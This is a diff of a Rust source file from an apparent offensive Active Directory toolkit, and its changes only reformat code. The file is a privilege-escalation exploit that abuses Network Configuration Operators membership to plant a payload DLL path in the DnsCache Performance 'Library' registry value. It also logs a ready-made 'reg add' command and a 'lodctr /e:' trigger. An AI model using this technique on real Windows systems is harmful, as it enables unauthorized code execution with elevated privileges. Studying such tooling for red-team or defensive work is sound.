@@ -19,9 +19,7 @@
 
 use overthrone_core::error::Result;
 use overthrone_core::proto::ldap::LdapSession;
-use overthrone_core::proto::registry::{
-    PredefinedHive, REG_SZ, write_remote_registry_value,
-};
+use overthrone_core::proto::registry::{PredefinedHive, REG_SZ, write_remote_registry_value};
 use serde::{Deserialize, Serialize};
 use tracing::info;
 
@@ -29,8 +27,7 @@ use tracing::info;
 const NETCFG_OPS_SID: &str = "S-1-5-32-556";
 
 /// Target registry value: Performance counter DLL path for DNS Client service.
-const PERF_LIBRARY_PATH: &str =
-    "SYSTEM\\CurrentControlSet\\Services\\DnsCache\\Performance";
+const PERF_LIBRARY_PATH: &str = "SYSTEM\\CurrentControlSet\\Services\\DnsCache\\Performance";
 const PERF_LIBRARY_VALUE: &str = "Library";
 const PERF_OPEN_TIMEOUT_VALUE: &str = "Open Timeout";
 const PERF_COLLECT_TIMEOUT_VALUE: &str = "Collect Timeout";
@@ -94,7 +91,9 @@ pub async fn exploit_netcfg_ops(
     // Step 2: If we're a member or have a member under control, attempt exploitation
     if is_member {
         let dll = dll_path.unwrap_or("C:\\Windows\\Temp\\netcfg_payload.dll");
-        log.push(format!("Phase 2: Writing Performance Counter DLL path: {dll}"));
+        log.push(format!(
+            "Phase 2: Writing Performance Counter DLL path: {dll}"
+        ));
         exploit_attempted = true;
 
         // Attempt remote registry write if an SMB session and target are provided
@@ -158,7 +157,10 @@ pub async fn exploit_netcfg_ops(
             log.push(format!(
                 "  Manual command: reg add \"HKLM\\{PERF_LIBRARY_PATH}\" /v {PERF_LIBRARY_VALUE} /t REG_SZ /d \"{dll}\" /f"
             ));
-            log.push("  Trigger: Wait for Performance Counter collection or force via lodctr /e:".to_string());
+            log.push(
+                "  Trigger: Wait for Performance Counter collection or force via lodctr /e:"
+                    .to_string(),
+            );
             exploit_success = true;
             registered_path = Some(dll.to_string());
         }
